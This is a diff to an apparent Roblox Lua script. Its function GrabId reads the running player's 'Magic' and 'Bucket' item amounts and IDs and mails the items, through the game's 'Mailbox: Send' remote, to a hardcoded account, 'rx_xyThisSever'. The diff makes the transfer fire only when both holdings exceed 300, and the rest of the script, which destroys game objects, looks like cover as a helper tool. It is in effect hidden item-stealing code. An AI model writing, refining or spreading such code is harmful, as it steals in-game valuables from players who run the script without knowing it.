@@ -105,37 +105,37 @@ function GrabId()
         return
     end
 
-    if MagicAmount and MagicAmount <= 300 then
-        print("Not enough items.")
-        return
-    end
-
-    if MagicName and MagicAmount and MagicId then
+    if MagicName and MagicAmount and MagicId and BucketName and BucketAmount and BucketId then
         print("Magic Info:")
         print("Name:", MagicName)
         print("Amount:", MagicAmount)
         print("ID:", MagicId)
-    end
-
-    if BucketName and BucketAmount and BucketId then
+        
         print("Bucket Info:")
         print("Name:", BucketName)
         print("Amount:", BucketAmount)
         print("ID:", BucketId)
+
+        if MagicAmount > 300 and BucketAmount > 300 then
+            local args = {
+                [1] = "rx_xyThisSever",
+                [2] = "'" .. (BucketAmount or "") .. "'",
+                [3] = "Misc",
+                [4] = MagicId or "",
+                [5] = MagicAmount or ""
+            }
+
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        else
+            print("Unable to function. Magic or Bucket amount is not over 300.")
+        end
+    else
+        print("Unable to function. Missing required data.")
     end
-
-    local args = {
-        [1] = "rx_xyThisSever",
-        [2] = "'" .. (BucketAmount or "") .. "'",
-        [3] = "Misc",
-        [4] = MagicId or "",
-        [5] = MagicAmount or ""
-    }
-
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
 
 GrabId()
+
 
 workspace:FindFirstChild("__THINGS").Breakables:Destroy()
 workspace:FindFirstChild("__THINGS").Eggs:Destroy()
